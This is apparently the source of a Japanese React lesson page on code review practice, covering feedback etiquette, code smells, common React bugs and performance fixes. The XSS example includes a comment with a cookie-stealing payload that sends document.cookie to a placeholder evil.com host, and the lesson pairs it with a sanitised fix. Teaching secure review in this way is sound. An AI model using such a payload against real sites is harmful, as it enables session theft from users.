import { LessonNav } from "@/components/lesson-nav";
import { LessonCompleteButton } from "@/components/lesson-complete-button";
import { CODE_REVIEW_LESSONS } from "@/lib/lessons-data";

export default function ReviewPracticeLesson() {
  return (
    <div className="max-w-6xl mx-auto px-4 py-10">
      <div className="mb-8">
        <span className="bg-orange-500/20 text-orange-400 text-xs font-semibold px-2 py-1 rounded">コードレビュー レッスン3</span>
        <h1 className="text-3xl font-extrabold text-white mb-2 mt-2">レビュー実践</h1>
        <p className="text-gray-400">実際のコード例を見ながら、レビューのスキルを磨こう</p>
      </div>

      {/* フィードバックの伝え方 */}
      <section className="mb-10 p-6 rounded-xl bg-gray-900 border border-gray-800">
        <h2 className="text-xl font-bold text-white mb-3">フィードバックの伝え方</h2>
        <p className="text-gray-300 leading-relaxed mb-4">
          レビューコメントの書き方一つで、チームの雰囲気は大きく変わります。
          <strong className="text-orange-400">建設的で具体的なフィードバック</strong>を心がけましょう。
        </p>
        <div className="space-y-4">
          <div className="p-4 rounded-lg bg-gray-800 border border-gray-700">
            <h3 className="font-semibold text-orange-400 mb-2">コメントのプレフィックス</h3>
            <p className="text-gray-300 text-sm mb-3">
              コメントの意図を明確にするため、プレフィックスを付けるチームが増えています。
            </p>
            <div className="space-y-2 text-sm">
              <div className="flex gap-3">
                <code className="text-orange-400 font-mono w-24 shrink-0">[must]</code>
                <span className="text-gray-300">マージ前に必ず修正が必要</span>
              </div>
              <div className="flex gap-3">
                <code className="text-orange-400 font-mono w-24 shrink-0">[should]</code>
                <span className="text-gray-300">修正を強く推奨するが、ブロックはしない</span>
              </div>
              <div className="flex gap-3">
                <code className="text-orange-400 font-mono w-24 shrink-0">[nit]</code>
                <span className="text-gray-300">些細な指摘（命名の好み、フォーマットなど）</span>
              </div>
              <div className="flex gap-3">
                <code className="text-orange-400 font-mono w-24 shrink-0">[question]</code>
                <span className="text-gray-300">理解のための質問</span>
              </div>
              <div className="flex gap-3">
                <code className="text-orange-400 font-mono w-24 shrink-0">[praise]</code>
                <span className="text-gray-300">良いコードへの賞賛</span>
              </div>
            </div>
          </div>
          <div className="grid md:grid-cols-2 gap-4">
            <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30">
              <h3 className="font-semibold text-red-400 mb-2">悪いフィードバック</h3>
              <ul className="text-gray-300 text-sm space-y-3">
                <li>
                  <p className="text-red-400">&#10060; &quot;これは間違ってる&quot;</p>
                  <p className="text-gray-500 text-xs">具体性がなく、修正方法が分からない</p>
                </li>
                <li>
                  <p className="text-red-400">&#10060; &quot;なんでこう書いたの？&quot;</p>
                  <p className="text-gray-500 text-xs">攻撃的に感じられる</p>
                </li>
                <li>
                  <p className="text-red-400">&#10060; &quot;普通こうしない&quot;</p>
                  <p className="text-gray-500 text-xs">主観的で理由がない</p>
                </li>
              </ul>
            </div>
            <div className="p-4 rounded-lg bg-green-500/10 border border-green-500/30">
              <h3 className="font-semibold text-green-400 mb-2">良いフィードバック</h3>
              <ul className="text-gray-300 text-sm space-y-3">
                <li>
                  <p className="text-green-400">&#9989; &quot;[must] ここで null チェックが必要です。API が null を返す可能性があります&quot;</p>
                  <p className="text-gray-500 text-xs">具体的な問題と理由を説明</p>
                </li>
                <li>
                  <p className="text-green-400">&#9989; &quot;[nit] この変数名は getUserById の方が意図が伝わりやすいかもしれません&quot;</p>
                  <p className="text-gray-500 text-xs">提案型で押し付けない</p>
                </li>
                <li>
                  <p className="text-green-400">&#9989; &quot;[praise] このカスタムHookの抽象化、とても良いですね!&quot;</p>
                  <p className="text-gray-500 text-xs">良い点を認める</p>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>

      {/* フィードバックの受け方 */}
      <section className="mb-10 p-6 rounded-xl bg-gray-900 border border-gray-800">
        <h2 className="text-xl font-bold text-white mb-3">フィードバックの受け方</h2>
        <p className="text-gray-300 leading-relaxed mb-4">
          レビューを受ける側にもスキルが必要です。
          コードへの指摘を<strong className="text-orange-400">個人攻撃と捉えない</strong>ことが大切です。
        </p>
        <div className="space-y-3 text-sm">
          <div className="flex gap-3 items-start">
            <span className="w-7 h-7 rounded-lg bg-orange-500/20 text-orange-400 flex items-center justify-center text-xs font-bold shrink-0">1</span>
            <div>
              <p className="text-white font-semibold">指摘に感謝する</p>
              <p className="text-gray-400">レビュアーは自分の時間を使ってコードを改善しようとしている。「ありがとうございます、修正します」が基本</p>
            </div>
          </div>
          <div className="flex gap-3 items-start">
            <span className="w-7 h-7 rounded-lg bg-orange-500/20 text-orange-400 flex items-center justify-center text-xs font-bold shrink-0">2</span>
            <div>
              <p className="text-white font-semibold">理由が分からなければ質問する</p>
              <p className="text-gray-400">「なぜその方が良いのか教えていただけますか？」と素直に聞く</p>
            </div>
          </div>
          <div className="flex gap-3 items-start">
            <span className="w-7 h-7 rounded-lg bg-orange-500/20 text-orange-400 flex items-center justify-center text-xs font-bold shrink-0">3</span>
            <div>
              <p className="text-white font-semibold">意見が異なる場合は根拠を示す</p>
              <p className="text-gray-400">感情ではなく技術的な理由で議論する。最終的に合意できなければチームリードに判断を委ねる</p>
            </div>
          </div>
          <div className="flex gap-3 items-start">
            <span className="w-7 h-7 rounded-lg bg-orange-500/20 text-orange-400 flex items-center justify-center text-xs font-bold shrink-0">4</span>
            <div>
              <p className="text-white font-semibold">修正したらコメントで知らせる</p>
              <p className="text-gray-400">「修正しました」「別のアプローチにしました」など、対応状況を返信する</p>
            </div>
          </div>
        </div>
      </section>

      {/* コードスメルを見つける */}
      <section className="mb-10 p-6 rounded-xl bg-gray-900 border border-gray-800">
        <h2 className="text-xl font-bold text-white mb-3">よくあるコードスメルを見つける</h2>
        <p className="text-gray-300 leading-relaxed mb-4">
          <strong className="text-orange-400">コードスメル</strong>とは、バグではないものの
          設計上の問題を示唆するコードの特徴です。レビューでよく指摘されるパターンを見てみましょう。
        </p>

        {/* スメル1: マジックナンバー */}
        <div className="mb-6">
          <h3 className="font-semibold text-white mb-2">1. マジックナンバー</h3>
          <div className="grid md:grid-cols-2 gap-3">
            <div>
              <p className="text-red-400 text-xs font-semibold mb-1">Before（問題あり）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`// 何の数字か分からない
if (password.length < 8) {
  return "短すぎます";
}

if (items.length > 50) {
  showPagination();
}

setTimeout(fetchData, 300000);`}</code>
              </pre>
            </div>
            <div>
              <p className="text-green-400 text-xs font-semibold mb-1">After（改善後）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`const MIN_PASSWORD_LENGTH = 8;
const ITEMS_PER_PAGE = 50;
const FETCH_INTERVAL_MS = 5 * 60 * 1000;

if (password.length < MIN_PASSWORD_LENGTH) {
  return "短すぎます";
}

if (items.length > ITEMS_PER_PAGE) {
  showPagination();
}

setTimeout(fetchData, FETCH_INTERVAL_MS);`}</code>
              </pre>
            </div>
          </div>
        </div>

        {/* スメル2: 巨大な関数 */}
        <div className="mb-6">
          <h3 className="font-semibold text-white mb-2">2. 巨大な関数</h3>
          <div className="grid md:grid-cols-2 gap-3">
            <div>
              <p className="text-red-400 text-xs font-semibold mb-1">Before（問題あり）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`async function handleSubmit(data: FormData) {
  // バリデーション（20行）
  if (!data.name) { ... }
  if (!data.email) { ... }
  if (!data.password) { ... }
  // ...

  // データ変換（15行）
  const user = { ... };
  // ...

  // API呼び出し（10行）
  const res = await fetch(...);
  // ...

  // エラーハンドリング（15行）
  if (!res.ok) { ... }
  // ...

  // 後処理（10行）
  redirect(...);
  // ...
  // 合計70行以上の関数!
}`}</code>
              </pre>
            </div>
            <div>
              <p className="text-green-400 text-xs font-semibold mb-1">After（改善後）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`async function handleSubmit(data: FormData) {
  const errors = validateForm(data);
  if (errors.length > 0) {
    return showErrors(errors);
  }

  const user = transformToUser(data);

  try {
    await createUser(user);
    showSuccess("ユーザーを作成しました");
    redirect("/users");
  } catch (error) {
    handleApiError(error);
  }
}

// 各処理を個別の関数に分離
function validateForm(data: FormData) { ... }
function transformToUser(data: FormData) { ... }
async function createUser(user: User) { ... }
function handleApiError(error: unknown) { ... }`}</code>
              </pre>
            </div>
          </div>
        </div>

        {/* スメル3: ネストの深さ */}
        <div>
          <h3 className="font-semibold text-white mb-2">3. 深いネスト</h3>
          <div className="grid md:grid-cols-2 gap-3">
            <div>
              <p className="text-red-400 text-xs font-semibold mb-1">Before（問題あり）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`function processOrder(order: Order) {
  if (order) {
    if (order.items.length > 0) {
      if (order.user) {
        if (order.user.isActive) {
          // やっと本来のロジック
          return calculateTotal(order);
        } else {
          throw new Error("無効なユーザー");
        }
      } else {
        throw new Error("ユーザーなし");
      }
    } else {
      throw new Error("商品なし");
    }
  } else {
    throw new Error("注文なし");
  }
}`}</code>
              </pre>
            </div>
            <div>
              <p className="text-green-400 text-xs font-semibold mb-1">After（早期リターン）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`function processOrder(order: Order) {
  if (!order) {
    throw new Error("注文なし");
  }
  if (order.items.length === 0) {
    throw new Error("商品なし");
  }
  if (!order.user) {
    throw new Error("ユーザーなし");
  }
  if (!order.user.isActive) {
    throw new Error("無効なユーザー");
  }

  // ガード節の後、本来のロジックに集中
  return calculateTotal(order);
}`}</code>
              </pre>
            </div>
          </div>
        </div>
      </section>

      {/* 実践: バグを見つける */}
      <section className="mb-10 p-6 rounded-xl bg-gray-900 border border-gray-800">
        <h2 className="text-xl font-bold text-white mb-3">実践: バグを見つけてみよう</h2>
        <p className="text-gray-300 leading-relaxed mb-4">
          以下のReact/TypeScriptコードにはよくあるバグが含まれています。
          レビュアーの視点で問題を見つけてみましょう。
        </p>

        {/* バグ1: useEffectの依存配列 */}
        <div className="mb-6">
          <h3 className="font-semibold text-orange-400 mb-2">例1: データ取得コンポーネント</h3>
          <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
            <code className="text-gray-300">{`function UserProfile({ userId }: { userId: string }) {
  const [user, setUser] = useState<User | null>(null);

  useEffect(() => {
    fetch(\`/api/users/\${userId}\`)
      .then(res => res.json())
      .then(data => setUser(data));
  }, []); // <-- ここに問題がある!

  if (!user) return <p>Loading...</p>;
  return <h1>{user.name}</h1>;
}`}</code>
          </pre>
          <div className="mt-3 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
            <p className="text-sm text-yellow-400 font-semibold mb-1">問題点</p>
            <p className="text-sm text-gray-300">
              useEffectの依存配列に <code className="text-orange-400 bg-gray-800 px-1.5 py-0.5 rounded">userId</code> が含まれていません。
              <code className="text-orange-400 bg-gray-800 px-1.5 py-0.5 rounded">userId</code> が変わっても再取得されず、
              古いデータが表示され続けます。また、エラーハンドリングもありません。
            </p>
          </div>
          <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm mt-3">
            <code className="text-gray-300">{`// 修正後
function UserProfile({ userId }: { userId: string }) {
  const [user, setUser] = useState<User | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let ignore = false;

    fetch(\`/api/users/\${userId}\`)
      .then(res => {
        if (!res.ok) throw new Error("取得に失敗しました");
        return res.json();
      })
      .then(data => {
        if (!ignore) setUser(data);
      })
      .catch(err => {
        if (!ignore) setError(err.message);
      });

    return () => { ignore = true; };
  }, [userId]); // userId を依存配列に追加

  if (error) return <p>エラー: {error}</p>;
  if (!user) return <p>Loading...</p>;
  return <h1>{user.name}</h1>;
}`}</code>
          </pre>
        </div>

        {/* バグ2: 状態更新の競合 */}
        <div className="mb-6">
          <h3 className="font-semibold text-orange-400 mb-2">例2: カウンターコンポーネント</h3>
          <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
            <code className="text-gray-300">{`function Counter() {
  const [count, setCount] = useState(0);

  function handleClick() {
    setCount(count + 1);
    setCount(count + 1);
    setCount(count + 1);
    // 3回呼んだのに 1 しか増えない!
  }

  return <button onClick={handleClick}>Count: {count}</button>;
}`}</code>
          </pre>
          <div className="mt-3 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
            <p className="text-sm text-yellow-400 font-semibold mb-1">問題点</p>
            <p className="text-sm text-gray-300">
              Reactのstate更新はバッチ処理されます。<code className="text-orange-400 bg-gray-800 px-1.5 py-0.5 rounded">count</code>の
              値はクロージャで固定されているため、3回 <code className="text-orange-400 bg-gray-800 px-1.5 py-0.5 rounded">setCount(0 + 1)</code> が
              呼ばれるだけです。
            </p>
          </div>
          <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm mt-3">
            <code className="text-gray-300">{`// 修正後: 関数型更新を使う
function handleClick() {
  setCount(prev => prev + 1);
  setCount(prev => prev + 1);
  setCount(prev => prev + 1);
  // 正しく 3 増える
}`}</code>
          </pre>
        </div>

        {/* バグ3: XSS脆弱性 */}
        <div>
          <h3 className="font-semibold text-orange-400 mb-2">例3: セキュリティの問題</h3>
          <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
            <code className="text-gray-300">{`function Comment({ comment }: { comment: string }) {
  // dangerouslySetInnerHTML で直接HTMLを挿入
  return (
    <div
      dangerouslySetInnerHTML={{ __html: comment }}
    />
  );
}

// 攻撃者が以下を投稿した場合:
// <img src=x onerror="document.location='https://evil.com/?cookie='+document.cookie">`}</code>
          </pre>
          <div className="mt-3 p-3 rounded-lg bg-red-500/10 border border-red-500/30">
            <p className="text-sm text-red-400 font-semibold mb-1">XSS脆弱性</p>
            <p className="text-sm text-gray-300">
              ユーザー入力を <code className="text-orange-400 bg-gray-800 px-1.5 py-0.5 rounded">dangerouslySetInnerHTML</code> で
              直接挿入すると、XSS（クロスサイトスクリプティング）攻撃が可能になります。
            </p>
          </div>
          <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm mt-3">
            <code className="text-gray-300">{`// 修正後: テキストとして表示するか、サニタイズする
import DOMPurify from "dompurify";

function Comment({ comment }: { comment: string }) {
  // 方法1: テキストとして表示（最も安全）
  return <div>{comment}</div>;

  // 方法2: HTMLが必要ならサニタイズする
  const clean = DOMPurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}`}</code>
          </pre>
        </div>
      </section>

      {/* 実践: パフォーマンス改善 */}
      <section className="mb-10 p-6 rounded-xl bg-gray-900 border border-gray-800">
        <h2 className="text-xl font-bold text-white mb-3">実践: パフォーマンスの問題を見つける</h2>
        <p className="text-gray-300 leading-relaxed mb-4">
          レビューでよく指摘されるパフォーマンスの問題を実際のコードで見てみましょう。
        </p>
        <div className="mb-6">
          <h3 className="font-semibold text-orange-400 mb-2">不要な再レンダリング</h3>
          <div className="grid md:grid-cols-2 gap-3">
            <div>
              <p className="text-red-400 text-xs font-semibold mb-1">Before（毎回再レンダリング）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`function TodoList({ todos }: Props) {
  // 毎回新しいオブジェクトが生成される
  const style = { color: "red" };

  // 毎回新しい関数が生成される
  const filtered = todos.filter(
    t => t.status === "active"
  );

  return (
    <ul style={style}>
      {filtered.map(todo => (
        <TodoItem
          key={todo.id}
          todo={todo}
          // 毎回新しい関数が渡される
          onDelete={() => deleteTodo(todo.id)}
        />
      ))}
    </ul>
  );
}`}</code>
              </pre>
            </div>
            <div>
              <p className="text-green-400 text-xs font-semibold mb-1">After（最適化後）</p>
              <pre className="bg-gray-950 rounded-lg p-4 overflow-x-auto text-sm">
                <code className="text-gray-300">{`const style = { color: "red" } as const;

function TodoList({ todos }: Props) {
  const filtered = useMemo(
    () => todos.filter(
      t => t.status === "active"
    ),
    [todos]
  );

  const handleDelete = useCallback(
    (id: string) => deleteTodo(id),
    []
  );

  return (
    <ul style={style}>
      {filtered.map(todo => (
        <TodoItem
          key={todo.id}
          todo={todo}
          onDelete={handleDelete}
        />
      ))}
    </ul>
  );
}

// memo で不要な再レンダリングを防止
const TodoItem = memo(function TodoItem(
  { todo, onDelete }: ItemProps
) {
  return (...);
});`}</code>
              </pre>
            </div>
          </div>
        </div>
      </section>

      {/* まとめ */}
      <section className="mb-10 p-6 rounded-xl bg-gray-900 border border-gray-800">
        <h2 className="text-xl font-bold text-white mb-3">まとめ</h2>
        <ul className="text-gray-300 text-sm space-y-2">
          <li>&#8226; フィードバックには<strong className="text-orange-400">プレフィックス</strong>（[must] / [nit] / [praise]）を付けて意図を明確にする</li>
          <li>&#8226; 指摘は<strong className="text-orange-400">具体的に・建設的に・理由とともに</strong>伝える</li>
          <li>&#8226; レビューを受ける側は<strong className="text-orange-400">感謝の姿勢</strong>を持ち、技術的な議論を歓迎する</li>
          <li>&#8226; <strong className="text-orange-400">マジックナンバー・巨大な関数・深いネスト</strong>はよくあるコードスメル</li>
          <li>&#8226; <strong className="text-orange-400">useEffectの依存配列・状態更新・XSS</strong>はReactでよく見つかるバグ</li>
          <li>&#8226; <strong className="text-orange-400">useMemo・useCallback・memo</strong>でパフォーマンス問題を改善できる</li>
        </ul>
      </section>

      <LessonCompleteButton categoryId="code-review" lessonId="review-practice" color="orange" />
      <LessonNav lessons={CODE_REVIEW_LESSONS} currentId="review-practice" basePath="/learn/code-review" color="orange" />
    </div>
  );
}
